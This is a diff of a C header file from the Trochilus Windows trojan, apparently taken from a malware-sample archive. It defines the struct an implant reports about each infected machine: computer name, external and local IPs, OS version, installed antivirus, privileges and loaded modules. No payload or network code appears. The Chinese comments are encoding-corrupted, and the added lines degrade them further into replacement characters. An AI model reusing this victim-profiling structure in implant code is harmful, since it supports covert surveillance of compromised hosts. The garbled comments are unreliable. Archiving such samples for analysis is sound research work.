@@ -1,30 +1,41 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
 #include "env/EnvData.h"
 #include "ModuleMessage.h"
-//¿Í»§¶Ë»ù±¾ÐÅÏ¢
+//ï¿½Í»ï¿½ï¿½Ë»ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 #define MAX_LOCALIP_COUNT 5
 #define MAX_MODNAMES 1024
 #define MAX_ITEM 255
 typedef struct  
 {
-	WCHAR			clientid[60];	//¿Í»§¶Ëid
-	ULONG			connectIP;	//ÍâÍøIP
-	WCHAR			computerName[MAX_COMPUTERNAME_LENGTH + 1];	//¼ÆËã»úÃû
-	WIN_VER_DETAIL	windowsVersion;	//²Ù×÷ÏµÍ³
-	BOOL			bX64;	//ÊÇ·ñx64Æ½Ì¨
-	SYSTEMTIME		installTime;	//¿Í»§¶Ë°²×°Ê±¼ä
-	WCHAR			avname[MAX_PATH];	//É±¶¾Èí¼þ
-	ULONG			localIPList[MAX_LOCALIP_COUNT];	//±¾µØIPÁÐ±í
-	USHORT			localIPCount;	//±¾µØIPÁÐ±í¸öÊý
-	WCHAR			groups[MAX_ITEM]; //·Ö×éÃû
-	WCHAR			priv[MAX_ITEM]; //È¨ÏÞ
-	WCHAR			proto[MAX_ITEM]; //Ð­Òé
-	WCHAR			vercode[MAX_ITEM];//²Ù×÷ÏµÍ³°æ±¾ºÅ
-	WCHAR			lang[MAX_ITEM];//ÓïÑÔ
+	WCHAR			clientid[60];	//ï¿½Í»ï¿½ï¿½ï¿½id
+	ULONG			connectIP;	//ï¿½ï¿½ï¿½ï¿½IP
+	WCHAR			computerName[MAX_COMPUTERNAME_LENGTH + 1];	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	WIN_VER_DETAIL	windowsVersion;	//ï¿½ï¿½ï¿½ï¿½ÏµÍ³
+	BOOL			bX64;	//ï¿½Ç·ï¿½x64Æ½Ì¨
+	SYSTEMTIME		installTime;	//ï¿½Í»ï¿½ï¿½Ë°ï¿½×°Ê±ï¿½ï¿½
+	WCHAR			avname[MAX_PATH];	//É±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	ULONG			localIPList[MAX_LOCALIP_COUNT];	//ï¿½ï¿½ï¿½ï¿½IPï¿½Ð±ï¿½
+	USHORT			localIPCount;	//ï¿½ï¿½ï¿½ï¿½IPï¿½Ð±ï¿½ï¿½ï¿½ï¿½ï¿½
+	WCHAR			groups[MAX_ITEM]; //ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	WCHAR			priv[MAX_ITEM]; //È¨ï¿½ï¿½
+	WCHAR			proto[MAX_ITEM]; //Ð­ï¿½ï¿½
+	WCHAR			vercode[MAX_ITEM];//ï¿½ï¿½ï¿½ï¿½ÏµÍ³ï¿½æ±¾ï¿½ï¿½
+	WCHAR			lang[MAX_ITEM];//ï¿½ï¿½ï¿½ï¿½
 	int				cpunum;
 	int				cpufrep;
 	int				memsize;
-	WCHAR			mods[MAX_MODNAMES];	//ÒÑ°²×°Ä£¿é
+	WCHAR			mods[MAX_MODNAMES];	//ï¿½Ñ°ï¿½×°Ä£ï¿½ï¿½
 } CLIENT_INFO;
 enum {
 	WM_ADD_CLIENT = WM_USER + 1001,
